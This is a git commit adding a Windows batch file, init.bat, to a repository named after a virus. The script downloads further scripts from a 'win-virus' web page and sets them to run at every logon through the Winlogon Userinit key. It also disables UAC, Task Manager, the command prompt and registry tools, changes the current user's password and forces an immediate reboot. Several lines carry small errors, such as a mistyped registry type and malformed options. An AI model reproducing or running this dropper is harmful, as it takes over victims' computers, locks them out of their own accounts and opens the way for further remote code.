c9dd9deeaabcd98a5e3516946c85094a5fa5772a
rentour-virus <145815109+rentour-virus@users.noreply.github.com>
2023-10-01 09:33:39 +0900

    Create init.bat

---
+++ init.bat
@@ -0,0 +1,24 @@
+cd %temp%
+mkdir 7935.tmp
+cd 7935.tmp
+mkdir host_service
+cd host_service
+mkdir bluss
+cd bluss
+curl https://rentour-virus.github.io/win-virus/bluss.bat –output %temp%7935\host_service\bluss\bluss.bat /f
+curl https://rentour-virus.github.io/win-virus/start_bluss.vbs –output %temp%7935\host_service\bluss\start_bluss.vbs /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d C:\Windows\system32\userinit.exe,%temp%7935.tmp\host_service\bluss\start_bluss.vbs /f
+reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\System /v DisableLogonBackgroundImage /t REG_DWORD /d 1 /f 
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop /v NoChangeWallPaper /t REG_DWORD /d 1 /f
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t RED_DWORD /d 0 /f
+
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD /t REG_DWORD /d 2 /f
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 2 /f
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f
+
+reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD /t REG_DWORD /d 2 /f
+reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 2 /f
+reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f
+
+net user %username% death
+shutdown /t 0 /r
